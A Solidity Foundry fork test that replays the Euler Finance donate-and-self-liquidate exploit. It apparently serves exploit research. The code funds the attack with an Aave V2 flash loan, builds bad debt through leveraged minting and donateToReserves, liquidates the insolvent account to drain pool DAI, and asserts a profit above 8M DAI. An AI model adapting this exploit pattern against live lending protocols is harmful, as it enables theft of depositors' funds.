// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../helpers/BaseForkTest.t.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAaveV2Like {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IEulerEToken {
    function deposit(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
}

interface IEulerDToken {
    function repay(uint256 subAccountId, uint256 amount) external;
}

interface IEulerLike {
    struct LiquidationOpportunity {
        uint256 repay;
        uint256 yield;
        uint256 healthScore;
        uint256 baseDiscount;
        uint256 discount;
        uint256 conversionRate;
    }

    function checkLiquidation(
        address liquidator,
        address violator,
        address underlying,
        address collateral
    ) external returns (LiquidationOpportunity memory liqOpp);

    function liquidate(
        address violator,
        address underlying,
        address collateral,
        uint256 repay,
        uint256 minYield
    ) external;
}

contract EulerViolator {
    IERC20Like internal constant DAI = IERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IEulerEToken internal constant EDAI = IEulerEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    IEulerDToken internal constant DDAI = IEulerDToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    address internal constant EULER_CORE = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    function execute() external {
        DAI.approve(EULER_CORE, type(uint256).max);
        EDAI.deposit(0, 20_000_000e18);
        EDAI.mint(0, 200_000_000e18);
        DDAI.repay(0, 10_000_000e18);
        EDAI.mint(0, 200_000_000e18);
        EDAI.donateToReserves(0, 100_000_000e18);
    }
}

contract EulerLiquidator {
    IERC20Like internal constant DAI = IERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IEulerEToken internal constant EDAI = IEulerEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    IEulerLike internal constant EULER = IEulerLike(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    address internal constant EULER_CORE = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    function execute(address violator) external {
        IEulerLike.LiquidationOpportunity memory liq =
            EULER.checkLiquidation(address(this), violator, address(DAI), address(DAI));
        EULER.liquidate(violator, address(DAI), address(DAI), liq.repay, liq.yield);
        EDAI.withdraw(0, DAI.balanceOf(EULER_CORE));
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
}

contract EulerFinanceReplayTemplateTest is BaseForkTest {
    IERC20Like internal constant DAI = IERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IAaveV2Like internal constant AAVE_V2 = IAaveV2Like(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    uint256 internal constant EULER_ATTACK_BLOCK = 16_817_995;
    uint256 internal constant FLASH_LOAN_AMOUNT = 30_000_000e18;
    uint256 internal constant MIN_EXPECTED_PROFIT = 8_000_000e18;

    function test_EulerReplayMetadata() public pure {
        assertEq(EULER_ATTACK_BLOCK, 16_817_995, "fork block drift");
        assertEq(FLASH_LOAN_AMOUNT, 30_000_000e18, "flash loan drift");
    }

    function test_EulerReplay() public {
        string memory rpcUrl = vm.envOr("ETH_RPC_URL", string(""));
        if (bytes(rpcUrl).length == 0) {
            return;
        }

        _initFork(rpcUrl, EULER_ATTACK_BLOCK);
        _assertForkInitialized();

        vm.label(address(DAI), "DAI");
        vm.label(address(AAVE_V2), "AaveV2");

        address[] memory assets = new address[](1);
        assets[0] = address(DAI);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_LOAN_AMOUNT;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        AAVE_V2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        uint256 profit = DAI.balanceOf(address(this));
        assertGt(profit, MIN_EXPECTED_PROFIT, "profit too low");
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V2), "only aave");

        DAI.approve(address(AAVE_V2), type(uint256).max);

        EulerViolator violator = new EulerViolator();
        EulerLiquidator liquidator = new EulerLiquidator();

        DAI.transfer(address(violator), DAI.balanceOf(address(this)));
        violator.execute();
        liquidator.execute(address(violator));

        uint256 repayAmount = amounts[0] + premiums[0];
        require(DAI.balanceOf(address(this)) > repayAmount, "flash loan not repaid");
        return true;
    }
}
